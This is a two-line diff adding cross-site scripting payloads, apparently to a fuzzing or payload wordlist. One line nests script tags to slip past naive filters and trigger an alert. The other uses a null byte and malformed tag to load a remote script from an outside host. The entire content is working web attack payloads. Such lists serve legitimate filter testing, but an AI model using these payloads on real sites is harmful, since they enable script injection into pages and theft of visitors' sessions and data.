@@ -1,0 +1,2 @@
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+<<scr\0ipt/src=http://xss.com/xss.js></script
